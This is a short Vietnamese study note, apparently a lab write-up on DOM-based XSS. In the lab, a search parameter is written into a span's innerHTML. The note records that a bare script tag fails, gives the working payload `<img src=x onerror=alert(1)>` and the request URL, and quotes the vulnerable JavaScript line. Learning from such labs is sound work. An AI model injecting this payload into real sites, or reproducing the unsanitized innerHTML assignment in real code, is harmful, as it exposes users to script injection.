![[dom-innerhtml.png]]
lab search blog, source từ URL, sink là innerHTML của thẻ span.

> [!NOTE] phân tích đề
> - đề cho search blog.
> - JS lấy `location.search` -> gán vào `element.innerHTML`.
> - `innerHTML` không chạy `<script>` trần.
> - nên mình phải dùng thẻ có event handler.
> - đọc thêm [[lys thuyet XSS]] + [[DOM based Xss]].

### hướng giải
- [ ] nhập `x7Kp92Qa` -> xem URL `?search=x7Kp92Qa`.
- [ ] mở Elements -> thấy chuỗi nằm trong `<span>`.
- [ ] thử `<script>alert(1)</script>` -> không chạy.
- [ ] đổi sang `<img onerror>` -> chạy.

### giải
request:
```text
/?search=<img src=x onerror=alert(1)>
```

payload:
```html
<img src=x onerror=alert(1)>
```

JS lỗi:
```js
document.getElementById('searchResults').innerHTML = query;
```

kết quả:
-> ảnh load lỗi -> `onerror` bắn -> alert(1) hiện.
![[dom-innerhtml-result.png]]

> [!NOTE] bài học
> - sau khi quan sát lab này mình thấy... cùng là DOM nhưng sink khác thì payload khác.
> => nên mình nhớ: `document.write` thì `script` chạy được, `innerHTML` thì phải mượn event handler.
